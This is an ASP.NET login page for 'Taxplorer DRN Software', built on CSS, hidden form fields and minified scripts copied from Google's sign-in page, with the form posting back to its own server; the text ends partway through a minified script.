
<%@ Page Language="C#" AutoEventWireup="true" CodeFile="Login.aspx.cs" Inherits="Login2" %>
<%@ Register Assembly="AjaxControlToolkit" Namespace="AjaxControlToolkit" TagPrefix="asp" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html lang="en">
  <head>
  <link href="Styles/Login_style.css" type="text/css" rel="Stylesheet" />
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <meta content="width=300, initial-scale=1" name="viewport">
  <meta name="google" value="notranslate">
  <meta name="description" content="Gmail is email that&#39;s intuitive, efficient, and useful. 15 GB of storage, less spam, and mobile access.">
  <title>DRN</title>
<style>
  html, body {
  font-family: Arial, sans-serif;
  background: #fff;
  margin: 0;
  padding: 0;
  border: 0;
  position: absolute;
  height: 100%;
  min-width: 100%;
  font-size: 13px;
  color: #404040;
  direction: ltr;
  -webkit-text-size-adjust: none;
  }
  button,
  input[type=button],
  input[type=submit] {
  font-family: Arial, sans-serif;
  }
  a,
  a:hover,
  a:visited {
  color: #427fed;
  cursor: pointer;
  text-decoration: none;
  }
  a:hover {
  text-decoration: underline;
  }
  h1 {
  font-size: 20px;
  color: #262626;
  margin: 0 0 15px;
  font-weight: normal;
  }
  h2 {
  font-size: 14px;
  color: #262626;
  margin: 0 0 15px;
  font-weight: bold;
  }
  input[type=email],
  input[type=number],
  input[type=password],
  input[type=tel],
  input[type=text],
  input[type=url] {
  -moz-appearance: none;
  -webkit-appearance: none;
  appearance: none;
  display: inline-block;
  height: 36px;
  padding: 0 8px;
  margin: 0;
  background: #fff;
  border: 1px solid #d9d9d9;
  border-top: 1px solid #c0c0c0;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  -moz-border-radius: 1px;
  -webkit-border-radius: 1px;
  border-radius: 1px;
  font-size: 15px;
  color: #404040;
  }
  input[type=email]:hover,
  input[type=number]:hover,
  input[type=password]:hover,
  input[type=tel]:hover,
  input[type=text]:hover,
  input[type=url]:hover {
  border: 1px solid #b9b9b9;
  border-top: 1px solid #a0a0a0;
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  }
  input[type=email]:focus,
  input[type=number]:focus,
  input[type=password]:focus,
  input[type=tel]:focus,
  input[type=text]:focus,
  input[type=url]:focus {
  outline: none;
  border: 1px solid #4d90fe;
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  input[type=checkbox],
  input[type=radio] {
  -webkit-appearance: none;
  display: inline-block;
  width: 13px;
  height: 13px;
  margin: 0;
  cursor: pointer;
  vertical-align: bottom;
  background: #fff;
  border: 1px solid #c6c6c6;
  -moz-border-radius: 1px;
  -webkit-border-radius: 1px;
  border-radius: 1px;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  position: relative;
  }
  input[type=checkbox]:active,
  input[type=radio]:active {
  background: #ebebeb;
  }
  input[type=checkbox]:hover {
  border-color: #c6c6c6;
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  }
  input[type=radio] {
  -moz-border-radius: 1em;
  -webkit-border-radius: 1em;
  border-radius: 1em;
  width: 15px;
  height: 15px;
  }
  input[type=checkbox]:checked,
  input[type=radio]:checked {
  background: #fff;
  }
  input[type=radio]:checked::after {
  content: '';
  display: block;
  position: relative;
  top: 3px;
  left: 3px;
  width: 7px;
  height: 7px;
  background: #666;
  -moz-border-radius: 1em;
  -webkit-border-radius: 1em;
  border-radius: 1em;
  }
  input[type=checkbox]:checked::after {
  content: url(//ssl.gstatic.com/ui/v1/menu/checkmark.png);
  display: block;
  position: absolute;
  top: -6px;
  left: -5px;
  }
  input[type=checkbox]:focus {
  outline: none;
  border-color: #4d90fe;
  }
  .stacked-label {
  display: block;
  font-weight: bold;
  margin: .5em 0;
  }
  .hidden-label {
  position: absolute !important;
  clip: rect(1px 1px 1px 1px); /* IE6, IE7 */
  clip: rect(1px, 1px, 1px, 1px);
  height: 0px;
  width: 0px;
  overflow: hidden;
  visibility: hidden;
  }
  input[type=checkbox].form-error,
  input[type=email].form-error,
  input[type=number].form-error,
  input[type=password].form-error,
  input[type=text].form-error,
  input[type=tel].form-error,
  input[type=url].form-error {
  border: 1px solid #dd4b39;
  }
  .error-msg {
  margin: .5em 0;
  display: block;
  color: #dd4b39;
  line-height: 17px;
  }
  .help-link {
  background: #dd4b39;
  padding: 0 5px;
  color: #fff;
  font-weight: bold;
  display: inline-block;
  -moz-border-radius: 1em;
  -webkit-border-radius: 1em;
  border-radius: 1em;
  text-decoration: none;
  position: relative;
  top: 0px;
  }
  .help-link:visited {
  color: #fff;
  }
  .help-link:hover {
  color: #fff;
  background: #c03523;
  text-decoration: none;
  }
  .help-link:active {
  opacity: 1;
  background: #ae2817;
  }
  .wrapper {
  position: relative;
  min-height: 100%;
  }
  .content {
  padding: 0 44px;
  }
  .main {
  padding-bottom: 100px;
  }
  /* For modern browsers */
  .clearfix:before,
  .clearfix:after {
  content: "";
  display: table;
  }
  .clearfix:after {
  clear: both;
  }
  /* For IE 6/7 (trigger hasLayout) */
  .clearfix {
  zoom:1;
  }
  .google-header-bar {
  height: 71px;
  border-bottom: 1px solid #e5e5e5;
  overflow: hidden;
  }
  .header .logo {
  margin: 17px 0 0;
  float: left;
  height: 50px;
  width: 116px;
  }
  .header .secondary-link {
  margin: 28px 0 0;
  float: right;
  }
  .header .secondary-link a {
  font-weight: normal;
  }
  .google-header-bar.centered {
  border: 0;
  height: 108px;
  }
  .google-header-bar.centered .header .logo {
  float: none;
  margin: 40px auto 30px;
  display: block;
  }
  .google-header-bar.centered .header .secondary-link {
  display: none
  }
  .google-footer-bar {
  position: absolute;
  bottom: 0;
  height: 35px;
  width: 100%;
  border-top: 1px solid #e5e5e5;
  overflow: hidden;
  }
  .footer {
  padding-top: 7px;
  font-size: .85em;
  white-space: nowrap;
  line-height: 0;
  }
  .footer ul {
  float: left;
  max-width: 80%;
  padding: 0;
  }
  .footer ul li {
  color: #737373;
  display: inline;
  padding: 0;
  padding-right: 1.5em;
  }
  .footer a {
  color: #737373;
  }
  .lang-chooser-wrap {
  float: right;
  display: inline;
  }
  .lang-chooser-wrap img {
  vertical-align: middle;
  }
  .hidden {
  height: 0px;
  width: 0px;
  overflow: hidden;
  visibility: hidden;
  display: none !important;
  }
  .card {
  background-color: #f7f7f7;
  padding: 20px 25px 30px;
  margin: 0 auto 25px;
  width: 304px;
  -moz-border-radius: 2px;
  -webkit-border-radius: 2px;
  border-radius: 2px;
  -moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  -webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  }
  .card *:first-child {
  margin-top: 0;
  }
  .rc-button {
  display: inline-block;
  min-width: 46px;
  text-align: center;
  color: #444;
  font-size: 14px;
  font-weight: 700;
  height: 36px;
  padding: 0 8px;
  line-height: 36px;
  -moz-border-radius: 3px;
  -webkit-border-radius: 3px;
  border-radius: 3px;
  -o-transition: all 0.218s;
  -moz-transition: all 0.218s;
  -webkit-transition: all 0.218s;
  transition: all 0.218s;
  border: 1px solid #dcdcdc;
  background-color: #f5f5f5;
  background-image: -webkit-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -o-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: linear-gradient(top,#f5f5f5,#f1f1f1);
  -o-transition: none;
  -moz-user-select: none;
  -webkit-user-select: none;
  user-select: none;
  cursor: default;
  }
  .card .rc-button {
  width: 100%;
  padding: 0;
  }
  .rc-button:hover {
  border: 1px solid #c6c6c6;
  color: #333;
  text-decoration: none;
  -o-transition: all 0.0s;
  -moz-transition: all 0.0s;
  -webkit-transition: all 0.0s;
  transition: all 0.0s;
  background-color: #f8f8f8;
  background-image: -webkit-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -o-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: linear-gradient(top,#f8f8f8,#f1f1f1);
  -moz-box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  -webkit-box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  }
  .rc-button:active {
  background-color: #f6f6f6;
  background-image: -webkit-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -o-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: linear-gradient(top,#f6f6f6,#f1f1f1);
  -moz-box-shadow: 0 1px 2px rgba(0,0,0,0.1);
  -webkit-box-shadow: 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: 0 1px 2px rgba(0,0,0,0.1);
  }
  .rc-button-submit {
  border: 1px solid #3079ed;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.1);
  background-color: #4d90fe;
  background-image: -webkit-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -moz-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -ms-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -o-linear-gradient(top,#4d90fe,#4787ed);
  background-image: linear-gradient(top,#4d90fe,#4787ed);
  }
  .rc-button-submit:hover {
  border: 1px solid #2f5bb7;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.3);
  background-color: #357ae8;
  background-image: -webkit-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -moz-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -ms-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -o-linear-gradient(top,#4d90fe,#357ae8);
  background-image: linear-gradient(top,#4d90fe,#357ae8);
  }
  .rc-button-submit:active {
  background-color: #357ae8;
  background-image: -webkit-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -moz-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -ms-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -o-linear-gradient(top,#4d90fe,#357ae8);
  background-image: linear-gradient(top,#4d90fe,#357ae8);
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  .rc-button-red {
  border: 1px solid transparent;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.1);
  background-color: #d14836;
  background-image: -webkit-linear-gradient(top,#dd4b39,#d14836);
  background-image: -moz-linear-gradient(top,#dd4b39,#d14836);
  background-image: -ms-linear-gradient(top,#dd4b39,#d14836);
  background-image: -o-linear-gradient(top,#dd4b39,#d14836);
  background-image: linear-gradient(top,#dd4b39,#d14836);
  }
  .rc-button-red:hover {
  border: 1px solid #b0281a;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.3);
  background-color: #c53727;
  background-image: -webkit-linear-gradient(top,#dd4b39,#c53727);
  background-image: -moz-linear-gradient(top,#dd4b39,#c53727);
  background-image: -ms-linear-gradient(top,#dd4b39,#c53727);
  background-image: -o-linear-gradient(top,#dd4b39,#c53727);
  background-image: linear-gradient(top,#dd4b39,#c53727);
  }
  .rc-button-red:active {
  border: 1px solid #992a1b;
  background-color: #b0281a;
  background-image: -webkit-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -moz-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -ms-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -o-linear-gradient(top,#dd4b39,#b0281a);
  background-image: linear-gradient(top,#dd4b39,#b0281a);
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
</style>
<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
  .google-header-bar.centered {
  height: 83px;
  }
  .google-header-bar.centered .header .logo {
  margin: 25px auto 20px;
  }
  .card {
  margin-bottom: 20px;
  }
</style>
<style media="screen and (max-width: 580px)">
  html, body {
  font-size: 14px;
  }
  .google-header-bar.centered {
  height: 73px;
  }
  .google-header-bar.centered .header .logo {
  margin: 20px auto 15px;
  }
  .content {
  padding-left: 10px;
  padding-right: 10px;
  }
  .hidden-small {
  display: none;
  }
  .card {
  padding: 20px 15px 30px;
  width: 270px;
  }
  .footer ul li {
  padding-right: 1em;
  }
  .lang-chooser-wrap {
  display: none;
  }
</style>
<style>
  pre.debug {
  font-family: monospace;
  position: absolute;
  left: 0;
  margin: 0;
  padding: 1.5em;
  font-size: 13px;
  background: #f1f1f1;
  border-top: 1px solid #e5e5e5;
  direction: ltr;
  white-space: pre-wrap;
  width: 90%;
  overflow: hidden;
  }
</style>
  <%--<link href="//fonts.googleapis.com/css?family=Open+Sans:300,400&lang=en" rel="stylesheet" type="text/css">--%>
<style>
  .banner {
  text-align: center;
  }
  .banner h1 {
  font-family: 'Open Sans', arial;
  -webkit-font-smoothing: antialiased;
  color: #555;
  font-size: 42px;
  font-weight: 300;
  margin-top: 0;
  margin-bottom: 20px;
  }
  .banner h2 {
  font-family: 'Open Sans', arial;
  -webkit-font-smoothing: antialiased;
  color: #555;
  font-size: 18px;
  font-weight: 400;
  margin-bottom: 20px;
  }
  .signin-card {
  width: 274px;
  padding: 40px 40px;
  }
  .signin-card .profile-img {
  width: 96px;
  height: 96px;
  margin: 0 auto 10px;
  display: block;
  -moz-border-radius: 50%;
  -webkit-border-radius: 50%;
  border-radius: 50%;
  }
  .signin-card .profile-name {
  font-size: 16px;
  font-weight: bold;
  text-align: center;
  margin: 10px 0 0;
  min-height: 1em;
  }
  .signin-card input[type=email],
  .signin-card input[type=password],
  .signin-card input[type=text],
  .signin-card input[type=submit] {
  width: 100%;
  display: block;
  margin-bottom: 10px;
  z-index: 1;
  position: relative;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  }
  .signin-card #Email,
  .signin-card #Passwd,
  .signin-card .captcha {
  direction: ltr;
  height: 44px;
  font-size: 16px;
  }
  .signin-card #Email + .stacked-label {
  margin-top: 15px;
  }
  .signin-card #reauthEmail {
  display: block;
  margin-bottom: 10px;
  line-height: 36px;
  padding: 0 8px;
  font-size: 15px;
  color: #404040;
  line-height: 2;
  margin-bottom: 10px;
  font-size: 14px;
  text-align: center;
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  }
  .one-google p {
  margin: 0 0 10px;
  color: #555;
  font-size: 14px;
  text-align: center;
  }
  .one-google p.create-account,
  .one-google p.switch-account {
  margin-bottom: 60px;
  }
  .one-google img {
  display: block;
  width: 210px;
  height: 17px;
  margin: 10px auto;
  }
</style>
<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
  .banner h1 {
  font-size: 38px;
  margin-bottom: 15px;
  }
  .banner h2 {
  margin-bottom: 15px;
  }
  .one-google p.create-account,
  .one-google p.switch-account {
  margin-bottom: 30px;
  }
  .signin-card #Email {
  margin-bottom: 0;
  }
  .signin-card #Passwd {
  margin-top: -1px;
  }
  .signin-card #Email.form-error,
  .signin-card #Passwd.form-error {
  z-index: 2;
  }
  .signin-card #Email:hover,
  .signin-card #Email:focus,
  .signin-card #Passwd:hover,
  .signin-card #Passwd:focus {
  z-index: 3;
  }
</style>
<style media="screen and (max-width: 580px)">
  .banner h1 {
  font-size: 22px;
  margin-bottom: 15px;
  }
  .signin-card {
  width: 260px;
  padding: 20px 20px;
  margin: 0 auto 20px;
  }
  .signin-card .profile-img {
  width: 72px;
  height: 72px;
  -moz-border-radius: 72px;
  -webkit-border-radius: 72px;
  border-radius: 72px;
  }
</style>
<style>
  .jfk-tooltip {
  background-color: #fff;
  border: 1px solid;
  color: #737373;
  font-size: 12px;
  position: absolute;
  z-index: 800 !important;
  border-color: #bbb #bbb #a8a8a8;
  padding: 16px;
  width: 250px;
  }
 .jfk-tooltip h3 {
  color: #555;
  font-size: 12px;
  margin: 0 0 .5em;
  }
 .jfk-tooltip-content p:last-child {
  margin-bottom: 0;
  }
  .jfk-tooltip-arrow {
  position: absolute;
  }
  .jfk-tooltip-arrow .jfk-tooltip-arrowimplbefore,
  .jfk-tooltip-arrow .jfk-tooltip-arrowimplafter {
  display: block;
  height: 0;
  position: absolute;
  width: 0;
  }
  .jfk-tooltip-arrow .jfk-tooltip-arrowimplbefore {
  border: 9px solid;
  }
  .jfk-tooltip-arrow .jfk-tooltip-arrowimplafter {
  border: 8px solid;
  }
  .jfk-tooltip-arrowdown {
  bottom: 0;
  }
  .jfk-tooltip-arrowup {
  top: -9px;
  }
  .jfk-tooltip-arrowleft {
  left: -9px;
  top: 30px;
  }
  .jfk-tooltip-arrowright {
  right: 0;
  top: 30px;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplbefore,.jfk-tooltip-arrowup .jfk-tooltip-arrowimplbefore {
  border-color: #bbb transparent;
  left: -9px;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplbefore {
  border-color: #a8a8a8 transparent;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplafter,.jfk-tooltip-arrowup .jfk-tooltip-arrowimplafter {
  border-color: #fff transparent;
  left: -8px;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplbefore {
  border-bottom-width: 0;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplafter {
  border-bottom-width: 0;
  }
  .jfk-tooltip-arrowup .jfk-tooltip-arrowimplbefore {
  border-top-width: 0;
  }
  .jfk-tooltip-arrowup .jfk-tooltip-arrowimplafter {
  border-top-width: 0;
  top: 1px;
  }
  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplbefore,
  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplbefore {
  border-color: transparent #bbb;
  top: -9px;
  }
  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplafter,
  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplafter {
  border-color:transparent #fff;
  top:-8px;
  }
  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplbefore {
  border-left-width: 0;
  }
  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplafter {
  border-left-width: 0;
  left: 1px;
  }
  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplbefore {
  border-right-width: 0;
  }
  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplafter {
  border-right-width: 0;
  }
  .jfk-tooltip-closebtn {
  background: url("//ssl.gstatic.com/ui/v1/icons/common/x_8px.png") no-repeat;
  border: 1px solid transparent;
  height: 21px;
  opacity: .4;
  outline: 0;
  position: absolute;
  right: 2px;
  top: 2px;
  width: 21px;
  }
  .jfk-tooltip-closebtn:focus,
  .jfk-tooltip-closebtn:hover {
  opacity: .8;
  cursor: pointer;
  }
  .jfk-tooltip-closebtn:focus {
  border-color: #4d90fe;
  }
</style>
<style media="screen and (max-width: 580px)">
  .jfk-tooltip {
  display: none;
  }
</style>
<style>
  .need-help-reverse {
  float: right;
  }
  .remember .bubble-wrap {
  position: absolute;
  padding-top: 3px;
  -o-transition: opacity .218s ease-in .218s;
  -moz-transition: opacity .218s ease-in .218s;
  -webkit-transition: opacity .218s ease-in .218s;
  transition: opacity .218s ease-in .218s;
  left: -999em;
  opacity: 0;
  width: 314px;
  margin-left: -20px;
  }
  .remember:hover .bubble-wrap,
  .remember input:focus ~ .bubble-wrap,
  .remember .bubble-wrap:hover,
  .remember .bubble-wrap:focus {
  opacity: 1;
  left: inherit;
  }
  .bubble-pointer {
  border-left: 10px solid transparent;
  border-right: 10px solid transparent;
  border-bottom: 10px solid #fff;
  width: 0;
  height: 0;
  margin-left: 17px;
  }
  .bubble {
  background-color: #fff;
  padding: 15px;
  margin-top: -1px;
  font-size: 11px;
  -moz-border-radius: 2px;
  -webkit-border-radius: 2px;
  border-radius: 2px;
  -moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  -webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  }
  .dasher-tooltip {
  position: absolute;
  left: 50%;
  top: 380px;
  margin-left: 150px;
  }
  .dasher-tooltip .tooltip-pointer {
  margin-top: 15px;
  }
  .dasher-tooltip p {
  margin-top: 0;
  }
  .dasher-tooltip p span {
  display: block;
  }
</style>
<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
  .dasher-tooltip {
  top: 340px;
  }
</style>
  </head>

  <body>
  <div class="wrapper">
  <form id="Form1" name="login-form" runat="server" action="" method="post">
  <div class="google-header-bar  centered">
  <div class="header content clearfix">
  <img alt="DRN" class="logo" src="images/DRN LOGO FINAL.jpg">
  </div>
  </div>
  <br />
  <div class="main content clearfix">
<div class="banner">
<%--<h1>
  One account. All of Google.
</h1>--%>
  <h2 class="hidden-small">
  Sign in to continue to Taxplorer DRN Software
  </h2>
</div>
<div class="card signin-card clearfix">

<img class="profile-img" src="//ssl.gstatic.com/accounts/ui/avatar_2x.png" alt="">
<p class="profile-name"></p>
  <form novalidate method="post"  id="gaia_loginform">
  <input name="GALX" type="hidden"
           value="M13KJRDRXCg">
  <input name="continue" type="hidden">
  <input name="service" type="hidden" value="mail">
  <input name="hl" type="hidden" value="en">
  <input name="scc" type="hidden" value="1">
  <input name="sacu" type="hidden" value="1">
  <input type="hidden" id="_utf8" name="_utf8" value="&#9731;"/>
  <input type="hidden" name="bgresponse" id="bgresponse" value="js_disabled">
  <input type="hidden" id="pstMsg" name="pstMsg" value="0">
  <input type="hidden" id="dnConn" name="dnConn" value="">
  <input type="hidden" id="checkConnection" name="checkConnection" value="">
  <input type="hidden" id="checkedDomains" name="checkedDomains"
         value="youtube">
<label class="hidden-label" for="Email">Email</label>
<asp:TextBox ID="txt_username" runat="server" CssClass="textbox" TabIndex="1"></asp:TextBox> 
<label class="hidden-label" for="Passwd"></label>
     <asp:TextBox ID="txt_password" runat="server"  CssClass="textbox" 
                TextMode="Password" TabIndex="2"></asp:TextBox>
 <asp:Button ID="btn_login" runat="server"   Text="Login" class="rc-button rc-button-submit" type="submit" onclick="btn_login_Click" TabIndex="3" />
  <label class="remember">
  <%--<input id="PersistentCookie" name="PersistentCookie"
               type="checkbox" value="yes"
               >
  <span>
  Stay signed in
  </span>
    <div class="bubble-wrap" role="tooltip">
  <div class="bubble-pointer"></div>
  <div class="bubble">
  For your protection, keep this checked only on devices you use regularly.
  <a href="#" target="_blank">Learn more</a>
  </div>
  </div>
  </label>--%>
  <input type="hidden" name="rmShown" value="1">

  <td style="width:100px;" align="right">
                                                 <%--<a  href="#">
                                                            Forget Password?</a>--%></td>
  </form>
</div>

  </div>
  
</form>
  </div>
  <script>
      (function () {
          var splitByFirstChar = function (toBeSplit, splitChar) {
              var index = toBeSplit.indexOf(splitChar);
              if (index >= 0) {
                  return [toBeSplit.substring(0, index),
  toBeSplit.substring(index + 1)];
              }
              return [toBeSplit];
          }
          var langChooser_parseParams = function (paramsSection) {
              if (paramsSection) {
                  var query = {};
                  var params = paramsSection.split('&');
                  for (var i = 0; i < params.length; i++) {
                      var param = splitByFirstChar(params[i], '=');
                      if (param.length == 2) {
                          query[param[0]] = param[1];
                      }
                  }
                  return query;
              }
              return {};
          }
          var langChooser_getParamStr = function (params) {
              var paramsStr = [];
              for (var a in params) {
                  paramsStr.push(a + "=" + params[a]);
              }
              return paramsStr.join('&');
          }
          var langChooser_currentUrl = window.location.href;
          var match = langChooser_currentUrl.match("^(.*?)(\\?(.*?))?(#(.*))?$");
          var langChooser_currentPath = match[1];
          var langChooser_params = langChooser_parseParams(match[3]);
          var langChooser_fragment = match[5];

          var langChooser = document.getElementById('lang-chooser');
          var langChooserWrap = document.getElementById('lang-chooser-wrap');
          var langVisControl = document.getElementById('lang-vis-control');
          if (langVisControl && langChooser) {
              langVisControl.style.display = 'inline';
              langChooser.onchange = function () {
                  langChooser_params['lp'] = 1;
                  langChooser_params['hl'] = encodeURIComponent(this.value);
                  var paramsStr = langChooser_getParamStr(langChooser_params);
                  var newHref = langChooser_currentPath + "?" + paramsStr;
                  if (langChooser_fragment) {
                      newHref = newHref + "#" + langChooser_fragment;
                  }
                  window.location.href = newHref;
              };
          }
      })();
    </script>
<script type="text/javascript">
    var gaia_attachEvent = function (element, event, callback) {
        if (element.addEventListener) {
            element.addEventListener(event, callback, false);
        } else if (element.attachEvent) {
            element.attachEvent('on' + event, callback);
        }
    };
</script>
  <script>      var G; var Gb = function (a, b) { var c = a; a && "string" == typeof a && (c = document.getElementById(a)); if (b && !c) throw new Ga(a); return c }, Ga = function (a) { this.id = a; this.toString = function () { return "No element found for id '" + this.id + "'" } }; var Gc = {}, Gd; Gd = window.addEventListener ? function (a, b, c) { var d = function (a) { var b = c.call(this, a); !1 === b && Ge(a); return b }; a = Gb(a, !0); a.addEventListener(b, d, !1); Gf(a, b).push(d); return d } : window.attachEvent ? function (a, b, c) { a = Gb(a, !0); var d = function () { var b = window.event, d = c.call(a, b); !1 === d && Ge(b); return d }; a.attachEvent("on" + b, d); Gf(a, b).push(d); return d } : void 0; var Ge = function (a) { a.preventDefault ? a.preventDefault() : a.returnValue = !1; return !1 };
      var Gf = function (a, b) { Gc[a] = Gc[a] || {}; Gc[a][b] = Gc[a][b] || []; return Gc[a][b] }; var Gg = function () { try { return new XMLHttpRequest } catch (a) { for (var b = ["MSXML2.XMLHTTP.6.0", "MSXML2.XMLHTTP.3.0", "MSXML2.XMLHTTP", "Microsoft.XMLHTTP"], c = 0; c < b.length; c++) try { return new ActiveXObject(b[c]) } catch (d) { } } return null }, Gh = function () { this.g = Gg(); this.parameters = {} }; Gh.prototype.oncomplete = function () { };
      Gh.prototype.send = function (a) { var b = [], c; for (c in this.parameters) { var d = this.parameters[c]; b.push(c + "=" + encodeURIComponent(d)) } var b = b.join("&"), e = this.g, f = this.oncomplete; e.open("POST", a, !0); e.setRequestHeader("Content-type", "application/x-www-form-urlencoded"); e.onreadystatechange = function () { 4 == e.readyState && f({ status: e.status, text: e.responseText }) }; e.send(b) };
      Gh.prototype.get = function (a) { var b = this.oncomplete, c = this.g; c.open("GET", a, !0); c.onreadystatechange = function () { 4 == c.readyState && b({ status: c.status, text: c.responseText }) }; c.send() }; var Gj = function (a) { this.e = a; this.k = this.l(); if (null == this.e) throw new Gi("Empty module name"); }; G = Gj.prototype; G.l = function () { var a = window.location.pathname; return a && 0 == a.indexOf("/accounts") ? "/accounts/JsRemoteLog" : "/JsRemoteLog" };
      G.n = function (a, b, c) { var d = this.k, e = this.e || "", d = d + "?module=" + encodeURIComponent(e); a = a || ""; d = d + "&type=" + encodeURIComponent(a); b = b || ""; d = d + "&msg=" + encodeURIComponent(b); c = c || []; for (a = 0; a < c.length; a++) d = d + "&arg=" + encodeURIComponent(c[a]); try { var f = Math.floor(1E4 * Math.random()), d = d + "&r=" + String(f) } catch (g) { } return d }; G.send = function (a, b, c) { var d = new Gh; d.parameters = {}; try { var e = this.n(a, b, c); d.get(e) } catch (f) { } }; G.error = function (a, b) { this.send("ERROR", a, b) }; G.warn = function (a, b) { this.send("WARN", a, b) };
      G.info = function (a, b) { this.send("INFO", a, b) }; G.f = function (a) { var b = this; return function () { try { return a.apply(null, arguments) } catch (c) { throw b.error("Uncatched exception: " + c), c; } } }; var Gi = function () { }; var Gk = Gk || new Gj("uri"), Gl = RegExp("^(?:([^:/?#.]+):)?(?://(?:([^/?#]*)@)?([\\w\\d\\-\\u0100-\\uffff.%]*)(?::([0-9]+))?)?([^?#]+)?(?:\\?([^#]*))?(?:#(.*))?$"), Gm = function (a) { return "http" == a.toLowerCase() ? 80 : "https" == a.toLowerCase() ? 443 : null }, Gn = function (a, b) {
          var c = b.match(Gl)[1] || null, d, e = b.match(Gl)[3] || null; d = e && decodeURIComponent(e); e = Number(b.match(Gl)[4] || null) || null; if (!c || !d) return Gk.error("Invalid origin Exception", [String(b)]), !1; e || (e = Gm(c)); var f = a.match(Gl)[1] || null; if (!f || f.toLowerCase() !=
c.toLowerCase()) return !1; c = (c = a.match(Gl)[3] || null) && decodeURIComponent(c); if (!c || c.toLowerCase() != d.toLowerCase()) return !1; (d = Number(a.match(Gl)[4] || null) || null) || (d = Gm(f)); return e == d
